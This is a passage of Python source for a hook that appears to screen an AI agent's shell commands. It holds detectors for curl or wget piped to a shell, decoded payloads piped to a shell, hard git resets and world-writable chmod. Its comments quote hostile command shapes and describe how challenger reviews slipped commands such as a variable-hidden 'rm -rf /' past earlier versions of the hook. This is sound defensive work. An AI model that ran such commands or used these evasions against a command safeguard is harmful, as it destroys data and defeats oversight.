_ECHO_START_RE = re.compile(r"(?:echo|printf)(?=\s)")
# OBFUSCATION_PATTERNS[0]'s decoder alternatives, with the openssl `-d` lazy so
# the match END is the earliest one: the greedy tail `[^\n]*` absorbs the rest
# of the line, so an earlier end admits a superset of pipes. Under a lookahead so
# overlapping decoders (`openssl enc … curl …`) are all seen.
_DECODER_START_RE = re.compile(
    r"(?=("
    + _DECODER.replace(r"openssl\s+enc[^\n]*-d", r"openssl\s+enc[^\n]*?-d")
    + r"))",
    re.IGNORECASE,
)
ECHO_PIPE_SHELL_REGEX = re.compile(
    r"(?:echo|printf)\s+(.+?)\s*\|\s*(?:\w+\s+[^|]*\|\s*)*(ba|z|c|k|da)?sh\b"
)
DECODER_CHAIN_REGEX = re.compile(OBFUSCATION_PATTERNS[0], re.IGNORECASE)


def _positions(text: str, char: str) -> list[int]:
    out: list[int] = []
    at = text.find(char)
    while at != -1:
        out.append(at)
        at = text.find(char, at + 1)
    return out


def _echo_pipe_shell_group(command: str) -> str | None:
    """`ECHO_PIPE_SHELL_REGEX.search(command)` reduced to what the caller reads:
    None when there is no match, else the text of group 1 (the payload that
    `echo`/`printf` pipes toward a shell). Same result as the regex, in linear
    time (see the block comment above)."""
    pipes = _positions(command, "|")
    if not pipes:
        return None
    newlines = _positions(command, "\n")
    ok: dict[int, bool] = {}
    good: list[int] = []  # pipes whose tail reaches a shell, ascending
    for p in reversed(pipes):
        q = _SPACE_RUN_RE.match(command, p + 1).end()
        reached = _SHELL_TAIL_RE.match(command, q) is not None
        if not reached and _WORD_THEN_SPACE_RE.match(command, q):
            nxt = command.find("|", q)
            reached = nxt != -1 and ok.get(nxt, False)
        ok[p] = reached
        if reached:
            good.append(p)
    good.reverse()
    if not good:
        return None
    for start in _ECHO_START_RE.finditer(command):
        run_start = start.end()
        run_end = _SPACE_RUN_RE.match(command, run_start).end()
        g0 = run_end
        if g0 >= len(command):
            continue
        # The first tail-reaching pipe after the group's first character, with no
        # newline inside the group (a newline may sit in the whitespace that
        # precedes the pipe: `\s*` before `\|` crosses lines, `.` does not).
        i = bisect.bisect_right(good, g0)
        if i < len(good):
            pipe = good[i]
            j = bisect.bisect_right(newlines, g0)
            nl = newlines[j] if j < len(newlines) else None
            if nl is None or nl > pipe:
                return _group_text(command, g0, pipe)
            if _SPACE_RUN_RE.match(command, nl).end() >= pipe:
                # The newline is in the whitespace run just before the pipe.
                # (`nl` is the first newline after g0, so nothing else can
                # intervene; the run may also have started earlier.)
                return _group_text(command, g0, pipe)
        # `\s+` gives whitespace back to the group until the group's first
        # character is one `.` accepts (not a newline): the group is that lone
        # whitespace character, the rest of the run is the `\s*` before the pipe.
        if command[run_end] == "|" and ok.get(run_end, False):
            for at in range(run_end - 1, run_start, -1):
                if command[at] != "\n":
                    return command[at]
    return None


def _group_text(command: str, g0: int, pipe: int) -> str:
    """Group 1: from g0 to the pipe, minus the whitespace run before the pipe
    (the lazy group stops as soon as `\\s*\\|` can match) but at least 1 char."""
    end = pipe
    while end > g0 + 1 and command[end - 1].isspace():
        end -= 1
    return command[g0:end]


def _decoder_pipes_to_shell(form: str) -> bool:
    """`DECODER_CHAIN_REGEX.search(form) is not None` in linear time:
    `<decoder>[^\\n]*\\|\\s*(\\w[^\\n|]*\\|\\s*)*<shell>` (case-insensitive)."""
    pipes = _positions(form, "|")
    if not pipes:
        return False
    newlines = _positions(form, "\n")
    ok: dict[int, bool] = {}
    good: list[int] = []
    for p in reversed(pipes):
        q = _SPACE_RUN_RE.match(form, p + 1).end()
        reached = _SHELL_TAIL_RE_I.match(form, q) is not None
        if not reached and _WORD_RE.match(form, q):
            # `\w[^\n|]*\|`: the next `\n` or `|` after q must be a `|`.
            nxt = q + 1
            while nxt < len(form) and form[nxt] not in "\n|":
                nxt += 1
            reached = nxt < len(form) and form[nxt] == "|" and ok.get(nxt, False)
        ok[p] = reached
        if reached:
            good.append(p)
    if not good:
        return False
    good.reverse()
    for m in _DECODER_START_RE.finditer(form):
        end = m.end(1)
        i = bisect.bisect_left(good, end)
        if i == len(good):
            continue
        j = bisect.bisect_left(newlines, end)
        if j == len(newlines) or newlines[j] > good[i]:
            return True
    return False


# `curl[^\n]*\|\s*(ba|z|c|k|da)?sh\b` (and the wget twin) backtracked the
# greedy `[^\n]*` through every later pipe for every `curl`: `"curl | " * 4600
# + "ls"` took 2.3 s. The regexes stay in DANGEROUS_PATTERNS verbatim (other
# modules read that list as plain regexes); check_command routes these two
# entries to the linear scanner below instead of re.search.
_FETCH_PIPE_SHELL_WORD = {
    r"curl[^\n]*\|\s*(ba|z|c|k|da)?sh\b": re.compile("curl", re.IGNORECASE),
    r"wget[^\n]*\|\s*(ba|z|c|k|da)?sh\b": re.compile("wget", re.IGNORECASE),
}
_PIPE_SH_TAIL_RE = re.compile(r"\|\s*(ba|z|c|k|da)?sh\b", re.IGNORECASE)


def _fetch_pipes_to_shell(pattern: str, form: str) -> bool:
    """`re.search(pattern, form, re.IGNORECASE) is not None` in linear time
    for the two `_FETCH_PIPE_SHELL_WORD` patterns: some pipe that reaches a
    shell has a fetch word before it on the same line. The nearest fetch word
    before a pipe is the only one to check — an earlier one crosses every
    newline the nearest one crosses."""
    ends = [m.end() for m in _FETCH_PIPE_SHELL_WORD[pattern].finditer(form)]
    if not ends:
        return False
    newlines = _positions(form, "\n")
    for p in _positions(form, "|"):
        i = bisect.bisect_right(ends, p) - 1
        if i < 0:
            continue
        j = bisect.bisect_left(newlines, ends[i])
        if j < len(newlines) and newlines[j] < p:
            continue
        # `\s*` after each pipe stops at the next pipe, so these runs are
        # disjoint and the tail matches cost linear time in total.
        if _PIPE_SH_TAIL_RE.match(form, p):
            return True
    return False


# =============================================================================
# Hard-reset analysis (ref-first and global-option spellings)
# -----------------------------------------------------------------------------
# `git\s+reset\s+--hard\b` in DANGEROUS_PATTERNS catches the flag-first
# spellings and stays there unchanged: operation_loop.py and audit_exporter.py
# read the list as plain regexes. It cannot see `git reset HEAD~1 --hard`,
# `git -C /repo reset origin/main --hard` or `git -c k=v reset HEAD --hard`,
# and #637 showed that widening the regex is the wrong shape: two lazy spans
# in one pattern backtracked cubically (11 KB -> 65 s, past the hook timeout,
# so every later rule and the egress guard never ran), it narrowed what the
# old `\b` accepted (`--hard>/dev/null`, backticks, `${X:-...}`, backslash-
# newline continuations all passed), and it blocked `git grep -e reset -e
# --hard`, a trailing `# ... reset --hard` comment and `~/git/...` path words.
#
# So the hook judges the command the way _rm_catastrophic_target() judges a
# recursive delete: a small analyzer. One left-to-right pass over the text
# with a quote/substitution state machine (each character is consumed once;
# the only regexes are single-span runs anchored at the cursor) produces
# simple commands as word lists. A command is a hard reset when, after
# optional NAME=value assignments, reserved words (`!`, `{`, `then`, `do`, …)
# and wrapper commands (`sudo`, `env`, `command`, `exec`, `nohup`, `time`,
# `timeout`, `nice`, `xargs`, …) with their options, the command word's
# basename is `git`; after git's global options (`-C <dir>`, `-c <k=v>`,
# `--git-dir …`, `--no-pager`, …) the subcommand is `reset` (or a `-c
# alias.X=` defined on the same line that expands to one); and one of the
# remaining arguments before `--` is `--hard` or an abbreviation git accepts
# for it. Command boundaries are `;`, `&`, `|`, newline, `(`, `)`, and the
# bodies of `$(…)`, backticks and `${X:-…}` are commands of their own; the
# script argument of `sh -c`/`bash -c`/`eval` and a heredoc fed to a shell are
# analysed again, to a bounded depth. A `#` that starts a word ends the
# command; a redirect's target is not an argument; bash deletes a backslash-
# newline pair and so does the lexer.
#
# Fail direction: an exception or an exhausted budget inside the analyzer
# means "no verdict from THIS rule" (the regex above still runs); it never
# escapes the hook and never turns into a block of its own.
# =============================================================================
HARD_RESET_RULE = "git reset --hard (flag after the ref or git options)"


class _HardResetGiveUp(Exception):
    """The analysis budget ran out — no verdict from the hard-reset analyzer."""


_HR_PLAIN_U_RE = re.compile(r"[^\s'\"\\$`()<>;&|{}#]+")
_HR_PLAIN_D_RE = re.compile(r'[^"\\$`]+')
_HR_PLAIN_H_RE = re.compile(r"[^\\$`\n]+")
# After `${`: the parameter, an optional subscript, an optional operator. The
# text after an operator (`${X:-git reset --hard}`) is analysed as a command.
_HR_PARAM_RE = re.compile(
    r"[#!]?(?:[A-Za-z_][A-Za-z0-9_]*|[0-9]+|[@*#?$!-])(?:\[[^\]\n]*\])?(?::?[-=+?])?"
)
_HR_SIMPLE_PARAM_RE = re.compile(r"\$\{(?:[A-Za-z_][A-Za-z0-9_]*|[0-9]+|[@*#?$!-])\}")
_HR_ASSIGN_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_]*(?:\[[^\]]*\])?\+?=")
_HR_DURATION_RE = re.compile(r"[0-9.]+[smhd]?")
_HR_SHELLS = frozenset(
    {"sh", "bash", "zsh", "dash", "ksh", "mksh", "ash", "csh", "tcsh", "fish"}
)
_HR_RESERVED = frozenset(
    {"!", "{", "}", "if", "then", "else", "elif", "do", "while", "until", "coproc"}
)
# Wrapper commands that run their argument vector as a command, with the
# options of each that consume a separate argument.
_HR_WRAPPERS: dict[str, frozenset[str]] = {
    "sudo": frozenset(
        {"-u", "-g", "-h", "-p", "-C", "-D", "-r", "-t", "-U", "-T", "-R"}
        | {"--user", "--group", "--host", "--prompt", "--chdir", "--role", "--type"}
    ),
    "doas": frozenset({"-u", "-C"}),
    "env": frozenset({"-u", "-C", "--unset", "--chdir"}),
    "command": frozenset(),
    "builtin": frozenset(),
    "exec": frozenset({"-a"}),
    "nohup": frozenset(),
    "time": frozenset({"-f", "-o", "--format", "--output"}),
    "nice": frozenset({"-n", "--adjustment"}),
    "ionice": frozenset({"-c", "-n", "-p", "--class", "--classdata"}),
    "timeout": frozenset({"-s", "-k", "--signal", "--kill-after"}),
    "gtimeout": frozenset({"-s", "-k", "--signal", "--kill-after"}),
    "stdbuf": frozenset({"-i", "-o", "-e"}),
    "caffeinate": frozenset({"-t", "-w"}),
    "chronic": frozenset(),
    "unbuffer": frozenset(),
    "xargs": frozenset(
        {"-I", "-n", "-P", "-L", "-s", "-d", "-E", "-a", "--max-args"}
        | {"--max-procs", "--max-lines", "--delimiter", "--arg-file"}
    ),
}
# git options that come BEFORE the subcommand and consume a separate argument.
_HR_GIT_ARG_OPTS = frozenset(
    {
        "-C",
        "-c",
        "--git-dir",
        "--work-tree",
        "--namespace",
        "--config-env",
        "--super-prefix",
        "--attr-source",
    }
)
_HR_MAX_DEPTH = 4  # sh -c inside sh -c inside … ; each level re-reads its body
_HR_MAX_ALIAS_DEPTH = 3
_HR_BUDGET_FACTOR = 8  # total characters scanned, as a multiple of the input
_HR_PREFILTER = str.maketrans("", "", "'\"\\\n")


def _hr_reset_args_hard(args: list[str]) -> bool:
    """`--hard` (or an abbreviation parse-options accepts) before `--`."""
    for a in args:
        if a == "--":
            return False
        if len(a) >= 3 and "--hard".startswith(a):
            return True
    return False


def _hr_split_alias(value: str) -> list[str]:
    try:
        return shlex.split(value, comments=False, posix=True)
    except ValueError:
        return value.split()


def _hr_git_hit(args: list[str], nested: list[str], alias_depth: int = 0) -> bool:
    """argv after `git`: skip global options, then judge the subcommand."""
    aliases: dict[str, str] = {}
    j, n = 0, len(args)
    while j < n:
        a = args[j]
        if a in _HR_GIT_ARG_OPTS:
            if a == "-c" and j + 1 < n:
                key, sep, val = args[j + 1].partition("=")
                if sep and key.lower().startswith("alias."):
                    aliases[key[6:].lower()] = val
            j += 2
            continue
        if a.startswith("-") and a != "-":
            j += 1
            continue
        break
    if j >= n:
        return False
    sub, rest = args[j], args[j + 1 :]
    if sub == "reset":
        return _hr_reset_args_hard(rest)
    alias = aliases.get(sub.lower())
    if alias is None or alias_depth >= _HR_MAX_ALIAS_DEPTH:
        return False
    alias = alias.strip()
    if alias.startswith("!"):
        # A shell alias: git runs the text through `sh -c` with the
        # remaining arguments appended.
        nested.append(" ".join([alias[1:], *rest]))
        return False
    return _hr_git_hit(_hr_split_alias(alias) + rest, nested, alias_depth + 1)


def _hr_skip_wrapper(words: list[str], i: int, name: str) -> int:
    """Index of the command a wrapper (`sudo -u root`, `env A=1`, …) runs."""
    arg_opts = _HR_WRAPPERS[name]
    j, n = i + 1, len(words)
    while j < n:
        w = words[j]
        if w == "--":
            return j + 1
        if w.startswith("-") and len(w) > 1:
            j += 2 if w in arg_opts else 1
            continue
        if name == "env" and _HR_ASSIGN_RE.match(w):
            j += 1
            continue
        if name in ("timeout", "gtimeout") and _HR_DURATION_RE.fullmatch(w):
            j += 1
            continue
        break
    return j


def _hr_shell_script(words: list[str], j: int) -> str | None:
    """The script argument of `sh -c SCRIPT` (options may be clustered: -lc)."""
    has_c = False
    n = len(words)
    while j < n:
        w = words[j]
        if w == "--":
            j += 1
            break
        if w[:1] in ("-", "+") and len(w) > 1 and not w.startswith("--"):
            if "c" in w[1:]:
                has_c = True
            j += 2 if w[1:] in ("o", "O") else 1
            continue
        if w.startswith("--"):
            j += 1
            continue
        break
    if has_c and j < n:
        return words[j]
    return None


def _hr_command_hit(words: list[str], nested: list[str], depth: int = 0) -> bool:
    """Whether one simple command (a word list) is a hard reset."""
    i, n = 0, len(words)
    eval_queued = False
    while i < n:
        w = words[i]
        if _HR_ASSIGN_RE.match(w) or w in _HR_RESERVED:
            i += 1
            continue
        base = w.rsplit("/", 1)[-1]
        if base in _HR_WRAPPERS:
            i = _hr_skip_wrapper(words, i, base)
            continue
        if base in ("eval", "watch"):
            # Both re-parse their joined arguments as shell text (watch via
            # `sh -c`): read them again as a script — once per command, so
            # `eval eval eval …` stays linear — and also judge the unquoted
            # argv in place.
            i += 1
            if base == "watch":
                while i < n and words[i].startswith("-"):
                    i += 2 if words[i] in ("-n", "--interval") else 1
            if not eval_queued:
                nested.append(" ".join(words[i:]))
                eval_queued = True
            continue
        break
    if i >= n:
        return False
    w = words[i]
    base = w.rsplit("/", 1)[-1]
    if base == "git":
        return _hr_git_hit(words[i + 1 :], nested)
    if base in _HR_SHELLS:
        script = _hr_shell_script(words, i + 1)
        if script is not None:
            nested.append(script)
        return False
    if base == "find" and depth < 2:
        # `find … -exec CMD … ;` runs CMD once per match. The depth bound
        # keeps `find -exec find -exec …` linear.
        j = i + 1
        while j < n:
            if words[j] in ("-exec", "-execdir", "-ok", "-okdir"):
                k = j + 1
                while k < n and words[k] not in (";", "+"):
                    k += 1
                if _hr_command_hit(words[j + 1 : k], nested, depth + 1):
                    return True
                j = k
            j += 1
        return False
    # A command word whose value is only known at run time (`$G reset HEAD
    # --hard`, `$(which git) reset …`): judge it as git would be judged.
    if ("$" in w or "\x00" in w) and len(words) > i + 1 and words[i + 1] == "reset":
        return _hr_reset_args_hard(words[i + 2 :])
    return False


def _hr_lex(
    text: str, nested: list[str], start_mode: str = "u", judge=None
) -> str | None:
    """One pass over ``text``; returns the first hard-reset command found.

    ``judge(words, nested)`` decides whether one simple command is a hit;
    the default is the hard-reset rule (_hr_command_hit). _var_command_word
    passes its own, so both rules read commands through the same lexer.

    Scripts that must be analysed again (``sh -c`` bodies, ``eval`` args,
    shell aliases, heredocs fed to a shell or with an expanding body) are
    appended to ``nested`` for the caller.
    """
    n = len(text)
    i = 0
    mode = start_mode  # "u" unquoted, "d" double-quoted, "h" heredoc body
    words: list[str] = []
    cur: list[str] = []
    in_word = False
    skip_word = False  # the next word is a redirect target
    # frames: (kind, mode, words, cur, in_word, skip_word)
    stack: list[tuple] = []
    heredocs: list[tuple[str, bool, bool, bool]] = []  # delim, -, quoted, code
    hit: list[str] = []

    def end_word() -> None:
        nonlocal cur, in_word, skip_word
        if in_word:
            if skip_word:
                skip_word = False
            else:
                words.append("".join(cur))
        cur = []
        in_word = False

    def end_cmd() -> None:
        nonlocal words, skip_word
        end_word()
        skip_word = False
        if words and not hit and not (stack and stack[-1][0] == "arr"):
            if (judge or _hr_command_hit)(words, nested):
                hit.append(" ".join(w.replace("\x00", "$(…)") for w in words))
        words = []

    def push(kind: str) -> None:
        nonlocal words, cur, in_word, skip_word
        stack.append((kind, mode, words, cur, in_word, skip_word))
        words, cur, in_word, skip_word = [], [], False, False

    def pop(placeholder: bool) -> None:
        nonlocal words, cur, in_word, skip_word, mode
        end_cmd()
        kind, mode, words, cur, in_word, skip_word = stack.pop()
        if placeholder:
            # A `${…}` expansion with an operator keeps a `$` in the word so a
            # reader of the word still sees it was a parameter expansion.
            cur.append("${\x00}" if kind == "param" else "\x00")
            in_word = True

    def take_heredocs(pos: int) -> int:
        """Consume the heredoc bodies that start at ``pos``."""
        for delim, strip_tabs, quoted, code in heredocs:
            start = pos
            while pos < n:
                nl = text.find("\n", pos)
                end = n if nl == -1 else nl
                line = text[pos:end]
                if (line.lstrip("\t") if strip_tabs else line) == delim:
                    body = text[start:pos]
                    pos = end + 1
                    break
                pos = end + 1
            else:
                body = text[start:]
                pos = n
            if code:
                nested.append(body)
            elif not quoted and ("$(" in body or "`" in body):
                nested.append("\x01" + body)  # marker: lex in heredoc mode
        heredocs.clear()
        return pos

    while i < n and not hit:
        ch = text[i]
        if mode == "d":
            m = _HR_PLAIN_D_RE.match(text, i)
            if m:
                cur.append(m.group())
                i = m.end()
                continue
            if ch == '"':
                mode = "u"
                i += 1
            elif ch == "\\":
                nxt = text[i + 1 : i + 2]
                if nxt == "\n":
                    i += 2
                elif nxt in ('"', "\\", "$", "`"):
                    cur.append(nxt)
                    i += 2
                else:
                    cur.append(ch)
                    i += 1
            elif ch == "$" and text[i + 1 : i + 2] == "(":
                push("subst")
                mode = "u"
                i += 2
            elif ch == "`":
                push("bt")
                mode = "u"
                i += 1
            else:
                cur.append(ch)
                i += 1
            continue
        if mode == "h":
            m = _HR_PLAIN_H_RE.match(text, i)
            if m:
                i = m.end()
                continue
            if ch == "\\":
                i += 2
            elif ch == "$" and text[i + 1 : i + 2] == "(":
                push("subst")
                mode = "u"
                i += 2
            elif ch == "`":
                push("bt")
                mode = "u"
                i += 1
            else:
                i += 1
            continue
        # ---- unquoted ----
        m = _HR_PLAIN_U_RE.match(text, i)
        if m:
            cur.append(m.group())
            in_word = True
            i = m.end()
            continue
        if ch == "\n":
            end_cmd()
            i += 1
            if heredocs:
                i = take_heredocs(i)
        elif ch in " \t\r\f\v":
            end_word()
            i += 1
        elif ch == "\\":
            nxt = text[i + 1 : i + 2]
            if nxt != "\n":
                cur.append(nxt)
                in_word = True
            i += 2
        elif ch == "'":
            j = text.find("'", i + 1)
            j = n if j == -1 else j
            cur.append(text[i + 1 : j])
            in_word = True
            i = j + 1
        elif ch == '"':
            mode = "d"
            in_word = True
            i += 1
        elif ch == "$":
            nxt = text[i + 1 : i + 2]
            if nxt == "(":
                push("subst")
                i += 2
            elif nxt == "{" and _HR_SIMPLE_PARAM_RE.match(text, i):
                # `${x}` is `$x`: kept as text, so the word still names it.
                sm = _HR_SIMPLE_PARAM_RE.match(text, i)
                cur.append(sm.group())
                in_word = True
                i = sm.end()
            elif nxt == "{":
                push("param")
                pm = _HR_PARAM_RE.match(text, i + 2)
                i = pm.end() if pm else i + 2
            elif nxt == "'":
                j = i + 2
                while j < n and text[j] != "'":
                    j += 2 if text[j] == "\\" else 1
                cur.append(text[i + 2 : min(j, n)])
                in_word = True
                i = j + 1
            else:
                cur.append("$")
                in_word = True
                i += 1
        elif ch == "`":
            if stack and stack[-1][0] == "bt":
                pop(placeholder=True)
            else:
                push("bt")
            i += 1
        elif ch == "(":
            if in_word and cur and cur[-1].endswith("="):
                push("arr")  # arr=(a b c) is data, not a command
            else:
                end_word()
                push("paren")
            i += 1
        elif ch == ")":
            if stack and stack[-1][0] in ("subst", "paren", "arr"):
                pop(placeholder=stack[-1][0] == "subst")
            else:
                end_cmd()  # a `case` pattern, or unbalanced
            i += 1
        elif ch == "}":
            if stack and stack[-1][0] == "param":
                pop(placeholder=True)
            else:
                cur.append(ch)
                in_word = True
            i += 1
        elif ch == "{":
            cur.append(ch)
            in_word = True
            i += 1
        elif ch == "#":
            if in_word or (stack and stack[-1][0] == "param"):
                cur.append(ch)
                in_word = True
                i += 1
            else:
                nl = text.find("\n", i)
                i = n if nl == -1 else nl
        elif ch in "<>" or (ch == "&" and text[i + 1 : i + 2] == ">"):
            if in_word and "".join(cur).isdigit():
                cur, in_word = [], False  # `2>` — the fd is not an argument
            end_word()
            j = i
            while j < n and j - i < 3 and text[j] in "<>&|":
                j += 1
            op = text[i:j]
            i = j
            if op.startswith("<<") and not op.startswith("<<<"):
                strip_tabs = text[i : i + 1] == "-"
                if strip_tabs:
                    i += 1
                while i < n and text[i] in " \t":
                    i += 1
                delim: list[str] = []
                quoted = False
                while i < n and text[i] not in " \t\n;&|<>()":
                    c = text[i]
                    if c in "'\"":
                        quoted = True
                        k = text.find(c, i + 1)
                        k = n if k == -1 else k
                        delim.append(text[i + 1 : k])
                        i = k + 1
                    elif c == "\\":
                        quoted = True
                        delim.append(text[i + 1 : i + 2])
                        i += 2
                    else:
                        delim.append(c)
                        i += 1
                head = next((w for w in words if not _HR_ASSIGN_RE.match(w)), "")
                code = head.rsplit("/", 1)[-1] in _HR_SHELLS
                heredocs.append(("".join(delim), strip_tabs, quoted, code))
            elif text[i : i + 1] != "(":  # `<(…)` is a process substitution
                skip_word = True
        elif ch in ";&|":
            end_cmd()
            i += 1
        else:  # pragma: no cover - every character class is handled above
            cur.append(ch)
            in_word = True
            i += 1
    if not hit:
        end_cmd()
        while stack and not hit:  # unterminated substitutions: judge them too
            pop(placeholder=False)
    return hit[0] if hit else None


CHMOD_WORLD_RULE = "chmod that gives everyone write and execute (others: w and x)"

# Quote and escape characters are deleted, then the text is cut into
# tokens at whitespace and shell punctuation: no shell structure is read.
_CHMOD_DELETE = str.maketrans("", "", "'\"\\`")
_CHMOD_TOKEN_SPLIT = re.compile(r"[\s;&|()<>{}]+")
_CHMOD_OCTAL = re.compile(r"0*([0-7]{1,4})")
_CHMOD_CLAUSE = re.compile(r"([ugoa]*)((?:[-+=](?:[ugo]|[rwxXst]*))+)")
_CHMOD_ACTION = re.compile(r"([-+=])([ugo]|[rwxXst]*)")


def _chmod_others_after(mode: str) -> set[str] | None:
    """The permissions a chmod mode gives "others", or None if it is not a
    mode. Only what the mode itself grants counts; a copy from u, g or o is
    counted as a full grant, because the source bits are unknown."""
    octal = _CHMOD_OCTAL.fullmatch(mode)
    if octal:
        digit = int(octal.group(1)[-1])
        return {p for p, bit in (("r", 4), ("w", 2), ("x", 1)) if digit & bit}
    others: set[str] = set()
    for clause in mode.split(","):
        m = _CHMOD_CLAUSE.fullmatch(clause)
        if not m:
            return None
        who = m.group(1)
        if who and "a" not in who and "o" not in who:
            continue
        for op, perms in _CHMOD_ACTION.findall(m.group(2)):
            grant = {"r", "w", "x"} if perms in ("u", "g", "o") else set(perms)
            grant = {"x" if p == "X" else p for p in grant} & {"r", "w", "x"}
            if not who:
                grant.discard("w")  # the umask keeps others from w
            if op == "=":
                others = grant
            elif op == "+":
                others |= grant
            else:
                others -= grant
    return others


def _chmod_world_mode(token: str) -> bool:
    """A token that, as a chmod mode, leaves "others" with write and
    execute."""
    others = _chmod_others_after(token)
    return others is not None and {"w", "x"} <= others


def _is_chmod_word(token: str) -> bool:
    """chmod by name, in any case, by path, or as a glob the shell expands
    to it (`/bin/ch?od`)."""
    name = token.rsplit("/", 1)[-1].lower()
    if name == "chmod":
        return True
    return any(c in name for c in "*?[") and fnmatch.fnmatchcase("chmod", name)


# Run-time arithmetic or a parameter default next to chmod builds the mode
# where no token shows it (`chmod $((700+77)) f`, `a+rw${y:-x}`).
_CHMOD_RUNTIME = re.compile(r"\$\(\(|\$\{[^}]*:[-+=?]")
_CHMOD_SEGMENT_SPLIT = re.compile(r"[;&|\n]+")
# Redirections leave the text before the mode word is looked for: an fd
# duplication (`2>&1`, `>&2`) on its own, any other operator with its
# target (`2>/dev/null`, `&> log`, `< in`, `<<<x`).
_CHMOD_FD_DUP = re.compile(r"\d*[<>]&\d+-?")
_CHMOD_MASKED_AMP_REDIRECT = re.compile(r";\s*(?=>)")
_CHMOD_REDIRECT = re.compile(r"(\d*|&)(>>?|<<<|<<-?|<>?|>\|)\s*[^\s;&|<>()]*")
# chmod's own flags (BSD and GNU).
_CHMOD_FLAG = re.compile(
    r"--|-[RfvchHLP]+|--(recursive|verbose|changes|silent|quiet|"
    r"(no-)?preserve-root|dereference|no-dereference)"
)


def _chmod_world_writable(forms) -> bool:
    """True when a form holds a chmod word and, anywhere, a mode token that
    gives "others" write and execute: `a+rwx`, `a+rw,a+x`, `u=rwx,a=u`,
    `o+w,o+x`, `1777`, `-v 777`.

    Structure-free on purpose ("simple or explicit, else block"): seven
    challenger rounds against an analyzer that modelled the shell — quotes,
    -c and eval bodies, line continuations, redirections, here-strings,
    process substitution — each found a new way to hide the mode. Here
    nothing hides it: quotes and escapes are deleted and every token is
    checked. The cost is a block on a command that only mentions such a
    mode next to the word chmod, e.g. `echo chmod a+rwx`; quoted data
    (commit messages, grep patterns) is already masked in these forms.

    Numbers are the one exception: a digits-only token counts only in the
    same `;`/`&`/`|`/newline segment as the chmod word, so `chmod +x x &&
    gh pr view 777` passes while `chmod 7 f` does not. A mode built by a
    program (`$(printf …)`, xargs) cannot be seen by any hook; that is a
    known limit.
    """
    for form in forms:
        flat = form.translate(_CHMOD_DELETE)
        if "ch" not in flat.lower():
            continue
        tokens = [t for t in _CHMOD_TOKEN_SPLIT.split(flat) if t]
        if not any(_is_chmod_word(t) for t in tokens):
            continue
        if any(not t.isdigit() and _chmod_world_mode(t) for t in tokens):
            return True
        # A number is a mode only as the first word after chmod and its own
        # flags (`chmod -R 7 f`); elsewhere it is a PR number, a port or
        # grep's `-C 3`. The same word is the only place where run-time
        # arithmetic or a parameter default builds a mode. Redirections go
        # first, so neither their fd numbers nor their targets are read.
        # The structural mask writes `&>` as `; >`; put it back so the
        # redirection stays inside the chmod command.
        flat = _CHMOD_MASKED_AMP_REDIRECT.sub("&", flat)
        plain = _CHMOD_REDIRECT.sub(" ", _CHMOD_FD_DUP.sub(" ", flat))
        for segment in _CHMOD_SEGMENT_SPLIT.split(plain):
            after_chmod = False  # one pass: the word after chmod and flags
            for word in segment.split():
                if _is_chmod_word(word.strip("$({})")):
                    after_chmod = True
                elif after_chmod and not _CHMOD_FLAG.fullmatch(word):
                    if _CHMOD_RUNTIME.search(word):
                        return True
                    if word.isdigit() and _chmod_world_mode(word):
                        return True
                    after_chmod = False
    return False


def _hard_reset_command(forms) -> str | None:
    """The first simple command, in any canonical form, that is a hard reset.

    Returns None when there is none — and also when the analysis gives up
    (budget exhausted, or an unexpected error): the regex in
    DANGEROUS_PATTERNS still judges the flag-first spellings either way.
    """
    for form in forms:
        stripped = form.translate(_HR_PREFILTER)
        if "reset" not in stripped or "--h" not in stripped:
            continue
        try:
            budget = _HR_BUDGET_FACTOR * len(form) + 4096
            queue: list[tuple[str, int]] = [(form, 0)]
            while queue:
                text, depth = queue.pop()
                budget -= len(text)
                if budget < 0:
                    raise _HardResetGiveUp
                nested: list[str] = []
                if text.startswith("\x01"):
                    hit = _hr_lex(text[1:], nested, start_mode="h")
                else:
                    hit = _hr_lex(text, nested)
                if hit is not None:
                    return hit
                if depth < _HR_MAX_DEPTH:
                    queue.extend((s, depth + 1) for s in nested)
        except _HardResetGiveUp:
            continue
        except Exception:  # noqa: BLE001 - an analyzer bug must not end the hook
            continue
    return None


# =============================================================================
# A variable in command position: resolved only when unambiguous
# =============================================================================
# _resolve_vars splices ONE value per variable — the last assignment in the
# text — into every use. When the variable names the command, that reading
# decides the verdict, and it was wrong whenever the value at the use was a
# different one: `x=rm; $x -rf /; x=echo` read as `echo -rf /` and passed
# (2026-10-18, third challenger review of #735).
#
# The value at a use is not modelled (which assignment ran depends on order,
# `&&`, subshells, loops and functions). The rule is "simple or explicit,
# else block": a word in command position that holds a parameter expansion
# passes only when every such parameter is
#   * unbound in the command — no assignment and no other binding of the name
#     anywhere in the text: its value comes from the environment, which a
#     Bash tool call cannot set for a later call; or
#   * bound unambiguously — every `NAME=` in the text is an assignment word
#     _assignment_words reads, all of them carry the same value, the first
#     comes before the first use, and no binding builtin (`for`, `read`,
#     `printf -v`, `export`, …) names it.
# Everything else blocks: two different values, an assignment the reader
# cannot see (`(x=echo)`, `((x=1))`), a use before the assignment, a loop
# variable, a positional or special parameter (`$1`, `$@`, `$?`) and any
# `${…}` with an operator, subscript or indirection.
#
# Commands are read by the hard-reset lexer (_hr_lex), so the command word is
# found after assignments, reserved words and wrappers (`sudo`, `env`,
# `nohup`, `xargs`, …), and `sh -c` bodies, `eval` and `watch` arguments and
# `find -exec` commands are read as commands too. Unlike the hard-reset rule
# an exhausted budget is a block (_AnalysisTooComplex), not a give-up.
VAR_COMMAND_RULE = "variable in command position with an ambiguous value"

_VC_REF_RE = re.compile(r"\$(?:\{([^}]*)\}?|([A-Za-z_]\w*|[0-9@*#?!$-]))")
_VC_NAME_RE = re.compile(r"[A-Za-z_]\w*")
_VC_BIND_VERB_RE = re.compile(
    r"(?<![\w.-])(?:for|select|read|mapfile|readarray|getopts|printf|declare"
    r"|typeset|local|let|unset)(?![\w-])"
)


class _VarAmbiguity:
    """Per-form answers to "is NAME's value ambiguous?", computed lazily."""

    def __init__(self, text: str) -> None:
        self.text = text
        self._assigns: tuple[tuple[int, str, str], ...] | None = None
        self._bind_verb: bool | None = None
        self._cache: dict[str, bool] = {}

    def ambiguous(self, name: str) -> bool:
        hit = self._cache.get(name)
        if hit is None:
            if len(self._cache) >= _MAX_RESOLVED_VARS:
                raise _AnalysisTooComplex(
                    f"more than {_MAX_RESOLVED_VARS} distinct variables in "
                    f"command position"
                )
            hit = self._cache[name] = self._ambiguous(name)
        return hit

    def _ambiguous(self, name: str) -> bool:
        if not _VC_NAME_RE.fullmatch(name):
